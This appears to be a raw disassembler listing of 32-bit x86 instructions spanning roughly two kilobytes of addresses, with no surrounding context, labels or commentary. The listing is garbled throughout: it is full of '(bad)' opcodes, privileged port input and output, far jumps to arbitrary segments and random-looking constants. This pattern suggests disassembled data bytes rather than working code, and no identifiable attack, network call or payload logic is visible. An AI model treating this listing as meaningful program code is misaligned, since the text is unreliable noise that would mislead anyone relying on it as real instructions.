  426bf2:	jmp    0x426be5
  426bf4:	in     al,dx
  426bf5:	int3   
  426bf6:	repnz mov ebx,0xd2eeeae7
  426bfc:	in     eax,dx
  426bfd:	in     al,dx
  426bfe:	repnz fcmovnu st,st(5)
  426c01:	stc    
  426c02:	(bad)  
  426c03:	aam    0xe5
  426c05:	rol    cl,1
  426c07:	(bad)  
  426c09:	enter  0xc5ea,0xc5
  426c0d:	stc    
  426c0e:	shl    ecx,0xec
  426c11:	out    0xde,eax
  426c13:	mov    bh,0xd1
  426c15:	ret    0xeaa9
  426c18:	shl    BYTE PTR [edi+ecx*8-0x40100d1a],0xf1
  426c20:	idiv   DWORD PTR [edi-0x41260448]
  426c26:	mov    ebp,0x2fac9f0
  426c2b:	fmul   st(1),st
  426c2d:	dec    bl
  426c2f:	fcmove st,st(4)
  426c31:	fsubr  QWORD PTR [edi-0x2c24531f]
  426c37:	out    dx,al
  426c38:	retf   
  426c39:	leave  
  426c3a:	repnz cmc 
  426c3c:	cmc    
  426c3d:	lock mov eax,0xf8b9d6b8
  426c43:	(bad)  
  426c44:	loop   0x426c1d
  426c46:	or     ah,dh
  426c48:	out    0xf8,eax
  426c4a:	call   0x11e5638
  426c4f:	int3   
  426c50:	jecxz  0x426c1e
  426c52:	shr    DWORD PTR [esi-0x32480c2d],cl
  426c58:	mov    bl,0xcf
  426c5a:	mov    eax,0xd8dcf5ba
  426c5f:	mov    ah,0xc9
  426c61:	hlt    
  426c62:	iret   
  426c63:	mov    esp,0xf5ddc6f8
  426c68:	(bad)  
  426c69:	paddq  mm0,mm7
  426c6c:	add    bl,cl
  426c6e:	enter  0xc3c9,0xe0
  426c72:	mov    edx,0xf5e4e6af
  426c78:	out    0xba,al
  426c7a:	in     al,dx
  426c7b:	retf   
  426c7c:	hlt    
  426c7d:	cli    
  426c7e:	retf   0xf8f6
  426c81:	cld    
  426c82:	(bad)  
  426c83:	into   
  426c84:	loope  0x426c5d
  426c86:	add    edx,eax
  426c88:	fiadd  DWORD PTR [eax]
  426c8a:	add    eax,0xf02fe00
  426c8f:	icebp  
  426c90:	retf   0xf0bd
  426c93:	mov    ebp,0xc0eaeedc
  426c98:	aam    0xc4
  426c9a:	idiv   BYTE PTR [ecx-0x42473b09]
  426ca0:	add    al,cl
  426ca2:	mov    edi,0xf4ccd0f1
  426ca7:	out    0xe7,eax
  426ca9:	out    0xf7,al
  426cab:	std    
  426cac:	add    ah,bl
  426cae:	sti    
  426caf:	add    ebx,esi
  426cb1:	mov    cl,0xef
  426cb3:	mov    ebp,0xd2b6ecd1
  426cb8:	imul   DWORD PTR [esi-0xa15460f]
  426cbe:	fcmovbe st,st(7)
  426cc0:	repnz cmc 
  426cc2:	ret    0xe6f6
  426cc5:	aad    0xf4
  426cc7:	fxam   
  426cc9:	stc    
  426cca:	rol    DWORD PTR [esp+ebp*8],0x5
  426cce:	jmp    0xece4:0xd1beb2df
  426cd5:	retf   0xf7b4
  426cd8:	int    0xfa
  426cda:	fcmove st,st(6)
  426cdc:	shr    dh,cl
  426cde:	sar    al,1
  426ce0:	(bad)  
  426ce2:	push   es
  426ce3:	add    eax,0xd505ccdf
  426ce8:	or     al,BYTE PTR [esi]
  426cea:	push   cs
  426ceb:	iret   
  426cec:	aam    0x6
  426cee:	adc    bl,ah
  426cf0:	stos   DWORD PTR es:[edi],eax
  426cf1:	(bad)  
  426cf2:	fadd   st(2),st
  426cf4:	call   0xaff43eb5
  426cf9:	mov    ecx,0x3f0d5eb
  426cfe:	retf   
  426cff:	in     eax,dx
  426d00:	call   0xfb436b00
  426d05:	std    
  426d06:	mov    DWORD PTR [edi],0xd5bde6cb
  426d0c:	in     al,0xf8
  426d0e:	cld    
  426d0f:	loope  0x426cdf
  426d11:	scas   al,BYTE PTR es:[edi]
  426d12:	lock lods eax,DWORD PTR ds:[esi]
  426d14:	mov    ch,0xf7
  426d16:	mov    bh,0xc7
  426d18:	(bad)  
  426d19:	shl    ebx,cl
  426d1b:	fcmove st,st(7)
  426d1d:	sti    
  426d1e:	out    dx,eax
  426d1f:	(bad)  
  426d20:	test   edx,0xf403ccdd
  426d26:	cmc    
  426d27:	cli    
  426d28:	(bad)  
  426d29:	retf   0xeae4
  426d2c:	jecxz  0x426d19
  426d2e:	add    dl,cl
  426d30:	test   eax,0xaeedf7c1
  426d35:	in     al,dx
  426d36:	mov    ah,0xec
  426d38:	stc    
  426d39:	fcmovbe st,st(3)
  426d3b:	jmp    0x426cfb
  426d3d:	enter  0xbdb8,0xd7
  426d41:	int3   
  426d42:	clc    
  426d43:	lock add al,0x4
  426d46:	mov    dh,0xc7
  426d49:	(bad)  
  426d4a:	cld    
  426d4b:	hlt    
  426d4c:	leave  
  426d4d:	aam    0xfb
  426d4f:	stc    
  426d50:	in     al,0xa9
  426d52:	(bad)  
  426d53:	out    0xac,al
  426d55:	out    dx,eax
  426d56:	jmp    0x426d4c
  426d58:	(bad)  
  426d5a:	imul   bl
  426d5c:	into   
  426d5d:	shr    dl,cl
  426d5f:	cmc    
  426d60:	aam    0xbf
  426d62:	jecxz  0x426d5b
  426d64:	out    0xdb,al
  426d66:	imul   bl
  426d68:	push   eax
  426d6a:	add    eax,0x5fbdd
  426d6f:	int3   
  426d70:	out    dx,eax
  426d71:	shr    dh,1
  426d73:	fdiv   QWORD PTR [esi-0x2f193b1b]
  426d79:	neg    ecx
  426d7b:	leave  
  426d7c:	jmp    esp
  426d7e:	fdivr  QWORD PTR [esi+0x3d2fcfb]
  426d84:	shr    bl,cl
  426d86:	add    al,0xe0
  426d88:	or     esp,edi
  426d8a:	stc    
  426d8b:	add    bh,al
  426d8d:	push   cs
  426d8e:	repz add eax,0xd5c9c4d9
  426d94:	in     al,0xe2
  426d96:	test   eax,0xb1f3f9b2
  426d9b:	(bad)  
  426d9d:	mov    ch,0xcc
  426d9f:	mov    ebx,0xc0f1d602
  426da4:	add    eax,0xfb05f5f5
  426da9:	sti    
  426daa:	add    eax,0xf9e5c90a
  426daf:	pop    es
  426db0:	jmp    0xc3aa:0xd7e3e2d3
  426db7:	leave  
  426db8:	in     eax,0xb8
  426dba:	mov    ebx,0xcbbad4ac
  426dbf:	mov    al,0x1
  426dc1:	(bad)  
  426dc2:	mov    ecx,0xc4c4e4e1
  426dc7:	shl    dh,1
  426dc9:	or     dh,al
  426dcb:	shr    bl,0x4
  426dce:	fucomi st,st(6)
  426dd0:	scas   al,BYTE PTR es:[edi]
  426dd1:	int    0xf7
  426dd3:	scas   eax,DWORD PTR es:[edi]
  426dd4:	lods   eax,DWORD PTR ds:[esi]
  426dd5:	out    dx,al
  426dd6:	mov    bh,0xa8
  426dd8:	enter  0xf8e5,0xd4
  426ddc:	xlat   BYTE PTR ds:[ebx]
  426ddd:	lock push ebp
  426de0:	fadd   st(3),st
  426de2:	fcmovbe st,st(2)
  426de4:	in     al,dx
  426de5:	rcl    dl,0xd5
  426de8:	cli    
  426de9:	aad    0xe4
  426deb:	leave  
  426dec:	cld    
  426ded:	cld    
  426dee:	out    0xe4,eax
  426df0:	scas   al,BYTE PTR es:[edi]
  426df1:	jecxz  0x426de9
  426df3:	jmp    0xfa0431dd
  426df8:	sti    
  426df9:	idiv   DWORD PTR [ebx-0x200c2647]
  426dff:	(bad)  
  426e01:	add    bh,ch
  426e03:	add    esp,esp
  426e05:	(bad)  
  426e07:	in     eax,0xf5
  426e09:	(bad)  
  426e0a:	loope  0x426de8
  426e0c:	aad    0xef
  426e0e:	(bad)  
  426e0f:	jmp    0xadc5:0xe8a9d2a9
  426e16:	not    ebp
  426e18:	jmp    0xb4f31f16
  426e1d:	clc    
  426e1e:	jmp    0x426def
  426e20:	sar    DWORD PTR [esi-0x1f2e0f39],cl
  426e26:	stc    
  426e27:	retf   0x308
  426e2a:	iret   
  426e2b:	jecxz  0x426e0a
  426e2d:	leave  
  426e2e:	fcmovnu st,st(2)
  426e30:	test   eax,0xe1efc3bc
  426e35:	mov    ch,0xf6
  426e37:	mov    bl,0xf8
  426e39:	mov    edx,0xd4d6c8b7
  426e3e:	(bad)  
  426e3f:	hlt    
  426e40:	fsub   st(0),st
  426e42:	mov    eax,0x504fcd1
  426e47:	stc    
  426e48:	xlat   BYTE PTR ds:[ebx]
  426e49:	jecxz  0x426e36
  426e4b:	out    dx,eax
  426e4c:	add    ecx,ecx
  426e4e:	out    dx,eax
  426e4f:	add    ebp,DWORD PTR [edx-0x18333e16]
  426e55:	loop   0x426e2e
  426e57:	cmc    
  426e58:	(bad)  
  426e59:	in     eax,dx
  426e5a:	mov    eax,0xccdff7d9
  426e5f:	leave  
  426e60:	add    esi,ecx
  426e62:	fcomi  st,st(0)
  426e64:	(bad)
  426e67:	(bad)  
  426e68:	in     al,0xe9
  426e6a:	iret   
  426e6b:	or     eax,DWORD PTR [eax+ebp*8]
  426e6e:	add    eax,ebp
  426e70:	mov    bl,0xa8
  426e72:	call   0xeef8566a
  426e77:	hlt    
  426e78:	mov    cl,0xf4
  426e7a:	out    0xdb,eax
  426e7c:	retf   0xfbf3
  426e7f:	mov    ecx,0xee02efed
  426e84:	add    bh,dh
  426e86:	retf   
  426e87:	add    dh,al
  426e89:	stc    
  426e8a:	(bad)  
  426e8d:	repz fmul QWORD PTR [edi]
  426e90:	vcmpss xmm4,xmm6,xmm1,0xc3
  426e95:	hlt    
  426e96:	test   ebp,0xdaf1e8f3
  426e9c:	int3   
  426e9d:	fst    st(7)
  426e9f:	cmc    
  426ea0:	repz pop es
  426ea2:	shl    dl,1
  426ea4:	sar    dl,cl
  426ea6:	rol    edi,0xf0
  426ea9:	fcmovnbe st,st(7)
  426eab:	into   
  426eac:	retf   
  426ead:	push   cs
  426eae:	fucomp st(2)
  426eb0:	fild   QWORD PTR [edx+esi*8-0x304d4d2d]
  426eb7:	not    ch
  426eb9:	aad    0xf0
  426ebb:	shl    DWORD PTR [ebp-0x47204e12],cl
  426ec1:	rol    edx,0xc1
  426ec4:	mov    esp,0xfe05fdf9
  426ec9:	add    bh,bh
  426ecb:	add    cl,cl
  426ecd:	stc    
  426ece:	les    eax,FWORD PTR [edi]
  426ed0:	in     eax,0xbf
  426ed2:	mov    esi,0xe1ecafc9
  426ed7:	not    edx
  426ed9:	cmc    
  426eda:	(bad)  
  426edb:	out    0xdb,al
  426edd:	lock mov ecx,0xbffef301
  426ee3:	rcr    esi,1
  426ee5:	in     al,0xf8
  426ee7:	add    bh,ah
  426ee9:	xlat   BYTE PTR ds:[ebx]
  426eea:	or     cl,BYTE PTR [ebx]
  426eec:	jecxz  0x426ed9
  426eee:	jmp    0xb8031cbb
  426ef3:	loopne 0x426ea2
  426ef5:	retf   0xecb2
  426ef8:	retf   
  426ef9:	scas   al,BYTE PTR es:[edi]
  426efa:	out    dx,eax
  426efb:	(bad)  
  426efc:	mov    ebp,0xb9dfdbf1
  426f01:	icebp  
  426f02:	xlat   BYTE PTR ds:[ebx]
  426f03:	mov    esi,0xd1f8e107
  426f08:	fiadd  WORD PTR [eax]
  426f0a:	or     edx,ebp
  426f0c:	push   es
  426f0d:	fcmovne st,st(6)
  426f0f:	retf   0xc7df
  426f12:	(bad)  
  426f14:	(bad)  
  426f15:	out    0xd0,al
  426f17:	out    dx,al
  426f18:	(bad)  
  426f1b:	fcmovnbe st,st(4)
  426f1d:	fadd   st(3),st
  426f1f:	aam    0xdf
  426f21:	mov    esp,0xdff0e6de
  426f26:	or     bl,al
  426f28:	fcomp  st(4)
  426f2a:	add    eax,0x7dae3e6
  426f2f:	loop   0x426efc
  426f31:	fsubrp st(5),st
  426f33:	fdivr  st(3),st
  426f35:	loopne 0x426f25
  426f37:	in     al,0xf2
  426f39:	in     eax,0xcf
  426f3b:	iret   
  426f3c:	cli    
  426f3d:	int    0xc3
  426f3f:	into   
  426f40:	mov    esi,0xe705feb6
  426f45:	xlat   BYTE PTR ds:[ebx]
  426f46:	(bad)  
  426f48:	ffree  st(0)
  426f4a:	(bad)  
  426f4b:	fild   WORD PTR [ecx+eax*1]
  426f4e:	or     al,0xe1
  426f50:	lods   al,BYTE PTR ds:[esi]
  426f51:	jmp    0x426f22
  426f53:	jmp    0x426f24
  426f55:	(bad)  
  426f56:	icebp  
  426f57:	(bad)  
  426f58:	shl    BYTE PTR [ebx+esi*8-0x27293729],1
  426f5f:	clc    
  426f60:	fcomi  st,st(7)
  426f62:	sti    
  426f63:	out    dx,al
  426f64:	ror    esp,1
  426f66:	loopne 0x426f3f
  426f68:	lock (bad) 
  426f6b:	fstp   st(6)
  426f6d:	call   0xbd295d50
  426f72:	mov    esi,0xf1e4aedc
  426f77:	test   al,0xfa
  426f79:	mov    ah,0xeb
  426f7b:	mov    ch,0xda
  426f7d:	(bad)  
  426f7f:	fsubrp st(1),st
  426f81:	cli    
  426f82:	push   edi
  426f84:	add    al,bh
  426f86:	fld    DWORD PTR [edi]
  426f88:	std    
  426f89:	fdiv   st(2),st
  426f8b:	sti    
  426f8c:	(bad)  
  426f8e:	in     al,0xa
  426f90:	repnz mov cl,0xd2
  426f93:	(bad)  
  426f94:	shl    BYTE PTR [ebx-0x130c0a33],1
  426f9a:	int3   
  426f9b:	int3   
  426f9c:	icebp  
  426f9d:	dec    dh
  426f9f:	retf   0xdbe3
  426fa2:	shl    edx,cl
  426fa4:	rcr    al,1
  426fa6:	(bad)  
  426fa8:	(bad)  
  426fa9:	sti    
  426faa:	dec    BYTE PTR [ecx]
  426fac:	pmaxub mm1,mm4
  426faf:	iret   
  426fb0:	scas   al,BYTE PTR es:[edi]
  426fb1:	(bad)  
  426fb3:	out    0xd0,al
  426fb5:	in     al,0xb6
  426fb7:	ror    cl,0xd7
  426fba:	in     al,dx
  426fbb:	cli    
  426fbc:	shl    esp,1
  426fbe:	add    ebx,ebp
  426fc0:	sar    DWORD PTR [esp+ebp*8-0x3b22fe2c],1
  426fc7:	fdivrp st(1),st
  426fc9:	fsincos 
  426fcb:	std    
  426fcc:	in     eax,0x6
  426fce:	loope  0x426fd7
  426fd0:	stos   DWORD PTR es:[edi],eax
  426fd1:	lods   al,BYTE PTR ds:[esi]
  426fd2:	repz (bad) 
  426fd4:	in     eax,0xaa
  426fd6:	mov    bh,0xd0
  426fd8:	leave  
  426fd9:	hlt    
  426fda:	mov    ebx,0xd0f0cdb5
  426fdf:	(bad)  
  426fe0:	aam    0xf6
  426fe2:	mov    esi,0xbcd0c2d7
  426fe7:	cmc    
  426fe8:	fcmovb st,st(7)
  426fea:	call   0xce4e50fa
  426fef:	(bad)  
  426ff1:	stos   BYTE PTR es:[edi],al
  426ff2:	repnz mov ebp,0xcde5edea
  426ff8:	out    0xc0,al
  426ffa:	in     al,0xde
  426ffc:	fdivp  st(4),st
  426ffe:	retf   0x2c3
  427001:	shl    bl,0x1
  427004:	loopne 0x426fe8
  427006:	les    eax,FWORD PTR ds:0xc808c9de
  42700c:	in     al,dx
  42700d:	jmp    0xaff2:0xc6a9080f
  427014:	ror    ch,1
  427016:	mov    ah,0xba
  427018:	mov    al,0xe0
  42701a:	mov    cl,0xb9
  42701c:	in     eax,0xdc
  42701e:	cli    
  42701f:	(bad)  
  427021:	mov    edx,0xd8bf00d4
  427026:	rcl    ecx,1
  427028:	add    bh,dl
  42702a:	cli    
  42702b:	jmp    0xf444c04
  427030:	int    0xe1
  427032:	lods   eax,DWORD PTR ds:[esi]
  427033:	shl    esp,cl
  427035:	mov    bh,0xe8
  427037:	mov    bh,0xd1
  427039:	mov    al,0xde
  42703b:	fprem1 
  42703d:	rcl    edi,1
  42703f:	into   
  427040:	mov    edx,0xd9c0d9d1
  427045:	(bad)  
  427046:	inc    dh
  427048:	(bad)  
  42704a:	fdivp  st(1),st
  42704c:	cli    
  42704d:	loopne 0x427062
  42704f:	in     eax,dx
  427050:	rcr    esi,1
  427052:	(bad)  
  427053:	in     al,0xb5
  427055:	leave  
  427056:	out    0xb7,eax
  427058:	in     al,dx
  427059:	ror    esi,cl
  42705b:	jmp    0xdb01432b
  427060:	icebp  
  427061:	cli    
  427062:	rcr    bl,1
  427064:	mov    esi,0xdffd0bcc
  427069:	clc    
  42706a:	xlat   BYTE PTR ds:[ebx]
  42706b:	retf   0xeee8
  42706e:	fcompp 
  427070:	retf   
  427071:	out    dx,eax
  427072:	imul   ebx
  427074:	jecxz  0x427038
  427076:	in     eax,dx
  427077:	mov    dh,0xef
  427079:	mov    dh,0xb6
  42707b:	out    dx,eax
  42707c:	mov    ebx,0xe9b4f7ba
  427081:	repz fst st(4)
  427084:	rcr    bh,cl
  427086:	in     eax,0xfd
  427088:	cld    
  427089:	(bad)  
  42708b:	out    dx,eax
  42708c:	out    0xe6,al
  42708e:	or     edx,esp
  427090:	ret    
  427091:	ror    bh,1
  427093:	imul   dl
  427095:	mov    ch,0xc2
  427097:	fidiv  DWORD PTR [edi-0x4b2b0401]
  42709d:	xlat   BYTE PTR ds:[ebx]
  42709e:	into   
  42709f:	mov    ecx,0xd3f2cee0
  4270a4:	sar    dl,cl
  4270a6:	jmp    0x42706d
  4270a8:	ret    0xe2e5
  4270ab:	retf   
  4270ac:	add    eax,0xe1fff206
  4270b1:	repz retf 
  4270b3:	out    0xc7,eax
  4270b5:	int    0xca
  4270b7:	in     al,dx
  4270b8:	repnz mov cl,0xd0
  4270bb:	repz in eax,0xd3
  4270be:	inc    edx
  4270c0:	mov    edi,0xdcf600da
  4270c5:	stc    
  4270c6:	repnz (bad) 
  4270c8:	out    0xa,al
  4270ca:	sti    
  4270cb:	or     edi,eax
  4270cd:	retf   0xcf0d
  4270d0:	mov    esi,0xc7e0a8e0
  4270d5:	(bad)  
  4270d6:	test   eax,0xf5cbceba
  4270db:	faddp  st(4),st
  4270dd:	fst    st(2)
  4270df:	fsqrt  
  4270e1:	mov    ecx,0xd8d90103
  4270e6:	(bad)  
  4270e7:	(bad)  
  4270e8:	cld    
  4270e9:	(bad)  
  4270eb:	jmp    0x4270cc
  4270ed:	or     ah,bl
  4270ef:	sar    BYTE PTR [edx+ebp*8-0x2b110e18],0xc5
  4270f7:	aad    0xeb
  4270f9:	mov    eax,0xecc5e4bf
  4270fe:	mov    edi,0xf6d0bab9
  427103:	ret    
  427104:	pop    es
  427105:	shl    esp,1
  427107:	rcr    ebp,0xeb
  42710a:	in     eax,0x8
  42710c:	int    0xef
  42710e:	fldln2 
  427110:	(bad)  
  427111:	jmp    0x4270ff
  427113:	(bad)  
  427115:	in     eax,dx
  427116:	rcl    ebx,cl
  427118:	test   dh,0xf3
  42711b:	neg    dl
  42711d:	lock shl BYTE PTR [edx+esi*8-0x1f2f2f04],cl
  427125:	(bad)  
  427127:	hlt    
  427128:	shl    ah,0xe1
  42712b:	out    dx,eax
  42712c:	add    eax,0xd003dfdc
  427131:	in     eax,0xe9
  427133:	ret    
  427134:	lods   eax,DWORD PTR ds:[esi]
  427135:	jmp    0xe4ff:0xc9e7f7f1
  42713c:	(bad)  
  42713e:	lock into 
  427140:	add    BYTE PTR [esi+0x4c5c3b5],bh
  427146:	(bad)  
  427147:	in     eax,0xdd
  427149:	cli    
  42714a:	loop   0x427116
  42714c:	into   
  42714d:	aam    0xc9
  42714f:	in     eax,dx
  427150:	shr    eax,0xc4
  427153:	lods   eax,DWORD PTR ds:[esi]
  427154:	hlt    
  427155:	(bad)  
  427156:	mov    dl,0xcc
  427158:	(bad)  
  427159:	(bad)  
  42715a:	mov    bh,0xcc
  42715c:	mov    ah,0xf5
  42715e:	retf   0xbcf0
  427161:	rcr    edi,0xf0
  427164:	add    eax,0xf5ffc5d8
  427169:	add    BYTE PTR [esp+eax*8],al
  42716c:	or     eax,0xe5cbdce0
  427171:	fbstp  TBYTE PTR [eax-0x3114103b]
  427177:	mov    cl,0xb3
  427179:	not    ah
  42717b:	out    dx,al
  42717c:	rcr    edi,1
  42717e:	mov    ah,0xbf
  427180:	std    
  427181:	clc    
  427182:	in     al,dx
  427183:	fucom  st(5)
  427185:	cmc    
  427186:	add    al,0xe1
  427188:	add    BYTE PTR [ebx],al
  42718a:	fdiv   st(5),st
  42718c:	add    al,0xee
  42718e:	in     eax,dx
  42718f:	std    
  427190:	(bad)  
  427192:	enter  0xace6,0xcc
  427196:	hlt    
  427197:	shl    al,0xf8
  42719a:	mov    al,0xbf
  42719c:	(bad)  
  42719d:	int3   
  42719e:	stc    
  42719f:	enter  0xc1,0xe6
  4271a3:	idiv   DWORD PTR [esi-0x34160e25]
  4271a9:	or     ebp,ebx
  4271ab:	add    al,0x1
  4271ad:	fiadd  WORD PTR [edi]
  4271af:	adc    cl,ch
  4271b1:	les    edi,FWORD PTR [edi-0x3a0b080b]
  4271b7:	(bad)  
  4271b9:	(bad)  
  4271ba:	iret   
  4271bb:	aad    0xf4
  4271bd:	mov    esp,0x7d6eaec
  4271c2:	cld    
  4271c3:	ret    0xfdf0
  4271c6:	hlt    
  4271c7:	fxch   st(1)
  4271c9:	sti    
  4271ca:	fcomp  st(5)
  4271cc:	out    0xf9,al
  4271ce:	in     al,dx
  4271cf:	(bad)  
  4271d0:	fnstsw WORD PTR [esp+eax*8-0xe390a1c]
  4271d7:	stc    
  4271d8:	not    ch
  4271da:	in     eax,dx
  4271db:	aam    0xf5
  4271dd:	rcr    bh,cl
  4271df:	mov    eax,0xb4e102ef
  4271e4:	mul    ch
  4271e6:	loop   0x4271ee
  4271e8:	leave  
  4271e9:	mov    esi,0xdec608ea
  4271ee:	add    BYTE PTR [ecx],cl
  4271f0:	ret    0xe4d7
  4271f3:	(bad)  
  4271f4:	ret    
  4271f5:	enter  0xe2da,0xb2
  4271f9:	int    0xe4
  4271fb:	lock icebp 
  4271fd:	into   
  4271fe:	mov    ebp,0x207dc01
  427203:	clc    
  427204:	clc    
  427205:	xlat   BYTE PTR ds:[ebx]
  427206:	add    al,BYTE PTR [esi]
  427208:	(bad)  
  427209:	(bad)
  42720c:	add    eax,0xddeeea05
  427211:	rep lods eax,DWORD PTR ds:[esi]
  427213:	mov    bl,0xe9
  427215:	in     al,dx
  427216:	mov    bl,0xcf
  427218:	(bad)  
  42721a:	repnz mov al,0xf9
  42721d:	mov    ecx,0xcfedb9d3
  427222:	rol    dh,0xc0
  427225:	cmc    
  427226:	ror    BYTE PTR [ecx],1
  427228:	fxtract 
  42722a:	psubsw mm1,QWORD PTR [edi]
  42722d:	fimul  DWORD PTR [ebx*8-0x351f1d3a]
  427234:	loop   0x427216
  427236:	int3   
  427237:	vpsadbw xmm5,xmm4,xmm0
  42723b:	int3   
  42723c:	(bad)  
  42723e:	fcmovne st,st(2)
  427240:	fcomip st,st(2)
  427242:	into   
  427243:	out    dx,al
  427244:	lock fadd DWORD PTR [ecx+ebx*8]
  427248:	sti    
  427249:	mov    DWORD PTR [esi],0xfc0603f9
  42724f:	or     esp,esp
  427251:	jmp    0xaf235019
  427256:	shr    DWORD PTR [eax-0x21a1611],0xde
  42725d:	mov    esi,0xf2f7fbc3
  427262:	aad    0x7
  427264:	shl    esi,0xeb
  427267:	aad    0xfd
  427269:	(bad)  
  42726a:	mov    ebp,0x8fdfbe5
  427270:	fcomip st,st(2)
  427272:	shl    cl,1
  427274:	(bad)  
  427275:	in     al,0xf1
  427277:	mov    ch,0xf6
  427279:	out    0xde,eax
  42727b:	int    0xd6
  42727d:	leave  
  42727e:	jmp    0xfe05367b
  427283:	loope  0x427251
  427285:	hlt    
  427286:	(bad)  
  427287:	mov    esp,0x4fadce6
  42728c:	fdiv   st,st(3)
  42728e:	add    ebx,ecx
  427290:	scas   eax,DWORD PTR es:[edi]
  427291:	shl    ch,cl
  427293:	retf   
  427294:	jmp    0x427280
  427296:	retf   
  427297:	loop   0x42725d
  427299:	mov    al,0xb6
  42729b:	in     eax,0xf6
  42729d:	stc    
  42729e:	mov    cl,0xd6
  4272a0:	loope  0x4272a2
  4272a2:	(bad)  
  4272a3:	inc    DWORD PTR [edx]
  4272a5:	in     eax,0xd1
  4272a7:	mul    bl
  4272a9:	out    dx,eax
  4272aa:	hlt    
  4272ab:	loopne 0x427297
  4272ad:	int3   
  4272ae:	cli    
  4272af:	fnsave [ebx-0x4f521d3a]
  4272b5:	ror    eax,cl
  4272b7:	leave  
  4272b8:	mov    ecx,0xcad0ebeb
  4272bd:	clc    
  4272be:	add    dh,bh
  4272c0:	fild   WORD PTR [ebx]
  4272c2:	cmc    
  4272c3:	int3   
  4272c4:	(bad)  
  4272c6:	jmp    0x427298
  4272c8:	push   es
  4272c9:	enter  0xd5eb,0xfe
  4272cd:	out    dx,al
  4272ce:	add    bl,bh
  4272d0:	(bad)  
  4272d1:	jmp    0x4272bd
  4272d3:	fdiv   QWORD PTR [eax-0x49095233]
  4272d9:	push   ebx
  4272db:	mov    edx,0xcdeeffd5
  4272e0:	mov    eax,0xcdc3e2e2
  4272e5:	mov    ebp,0xe7dad8de
  4272ea:	rol    bh,0x1
  4272ed:	stc    
  4272ee:	(bad)  
  4272f0:	mov    esp,0xe0b1decb
  4272f5:	mov    dh,0xf0
  4272f7:	lock out 0xd5,eax
  4272fa:	not    esp
  4272fc:	in     al,0xfc
  4272fe:	mov    edx,0xfce1baf9
  427303:	fcomi  st,st(6)
  427305:	mov    edx,0x9f5d6f8
  42730a:	cli    
  42730b:	out    dx,eax
  42730c:	out    0x7,al
  42730e:	into   
  42730f:	stc    
  427310:	loop   0x4272d4
  427312:	out    0xe2,eax
  427314:	out    dx,al
  427315:	div    BYTE PTR [esi-0x20483912]
  42731b:	jmp    0xe1f7:0xd3d1eaf1
  427322:	(bad)  
  427323:	in     eax,0xfb
  427325:	hlt    
  427326:	add    al,0x1
  427328:	or     dh,bh
  42732a:	test   cl,0xce
  42732d:	leave  
  42732e:	(bad)  
  427330:	(bad)  
  427331:	repnz mul edx
  427334:	jmp    0xe61c5aef
  427339:	mov    ebx,0xebe5beee
  42733e:	std    
  42733f:	sar    BYTE PTR [eax-0x1a3e3c47],cl
  427345:	shl    edi,0xd2
  427348:	add    eax,DWORD PTR [eax]
  42734a:	add    BYTE PTR [edi],al
  42734c:	cmc    
  42734d:	dec    ebp
  42734f:	push   cs
  427350:	shl    bl,cl
  427352:	div    BYTE PTR [edi-0x83a300f]
  427358:	idiv   al
  42735a:	(bad)  
  42735b:	aad    0xbd
  42735d:	shl    dh,cl
  42735f:	(bad)  
  427361:	fucomp st(5)
  427363:	in     eax,dx
  427364:	stc    
  427365:	in     al,dx
  427366:	repnz cli 
  427368:	xlat   BYTE PTR ds:[ebx]
  427369:	add    edx,esi
  42736b:	jmp    0x21c5079
  427370:	mov    ebp,0xede2ebbc
  427376:	shl    DWORD PTR [ecx-0x2d09244d],1
  42737c:	int3   
  42737d:	aad    0xef
  42737f:	mov    esp,0xdbf2b6e8
  427384:	icebp  
  427385:	(bad)  
  427387:	mov    eax,0xec8ddf6
  42738c:	fucompp 
  42738e:	fadd   DWORD PTR [ecx]
  427390:	(bad)  
  427392:	(bad)  
  427393:	lock into 
  427395:	call   0xe039486e
  42739a:	in     al,dx
  42739b:	icebp  
  42739c:	retf   
  42739d:	jmp    0x427391
  42739f:	leave  
  4273a0:	aad    0xed
  4273a2:	aam    0xe2
  4273a4:	cli    
  4273a5:	mov    ebp,0xc406fde6
  4273aa:	(bad)  
  4273ac:	fcmovne st,st(7)
  4273ae:	int    0xd
  4273b0:	icebp  
  4273b1:	fsubr  st(3),st
  4273b3:	jmp    0xc4ec:0xd5c6dbc1
  4273ba:	enter  0xf8cf,0xdd
  4273be:	fcmovbe st,st(2)
  4273c0:	ret    0xeecd
  4273c3:	fcmove st,st(5)
  4273c5:	loope  0x4273a0
  4273c7:	jmp    0x4273c0
  4273c9:	ffreep st(7)
  4273cb:	out    0x8,al
  4273cd:	or     ebp,ecx
  4273cf:	loope  0x427389
  4273d1:	into   
  4273d2:	into   
  4273d3:	out    0xc2,al
  4273d5:	mov    bh,0xc8
  4273d7:	mov    ebx,0xb5e7e8d0
  4273dc:	test   dh,0xb5
  4273df:	repnz test DWORD PTR [edx],0xd5f5fcdc
  4273e6:	std    
  4273e7:	(bad)
  4273ea:	fiadd  WORD PTR [edx*8-0x163bec18]
  4273f1:	test   eax,0xcfc5a4cd
  4273f6:	mov    al,0xd7
  4273f8:	cmc    
  4273f9:	(bad)  
  4273fa:	mov    bh,0xc4
  4273fc:	(bad)  
  4273fe:	(bad)  
  4273ff:	icebp  
  427400:	out    dx,eax
  427401:	cld    
  427402:	cmc    
  427403:	(bad)  
  427405:	fistp  QWORD PTR [esp+edi*8-0x19fefb3e]
  42740c:	cli    
  42740d:	fcmovu st,st(2)
  42740f:	or     eax,0xdec6e3b8
  427414:	hlt    
  427415:	mov    ch,0xf0
  427417:	retf   
  427418:	icebp  
  427419:	retf   
  42741a:	fnstcw WORD PTR [ecx-0x1232202b]
  427420:	sar    DWORD PTR [eax+0x1c1de00],cl
  427426:	ret    
  427427:	pop    es
  427428:	aam    0xe5
  42742a:	push   cs
  42742b:	add    DWORD PTR [ebx],eax
  42742d:	cli    
  42742e:	fcomp  st(4)
  427430:	jmp    0xf4196ae7
  427435:	xlat   BYTE PTR ds:[ebx]
  427436:	call   0xe01c651c
  42743b:	enter  0xf6d9,0xbb
  42743f:	aad    0xc8
  427441:	shl    al,1
  427443:	loope  0x427428
  427445:	fild   WORD PTR [edi]
  427447:	fcmovnu st,st(7)
  427449:	retf   
  42744a:	push   es
  42744b:	or     eax,0x102e007
  427450:	in     al,dx
  427451:	shr    ch,1
  427453:	mov    dl,0xd6
  427455:	mov    esp,0xe9f7cab1
  42745a:	ror    bl,cl
  42745c:	clc    
  42745d:	(bad)  
  42745f:	mov    ecx,0xe3e3e8d9
  427464:	add    esp,ebx
  427466:	hlt    
  427467:	mov    edi,0xbe4f900
  42746d:	loop   0x427482
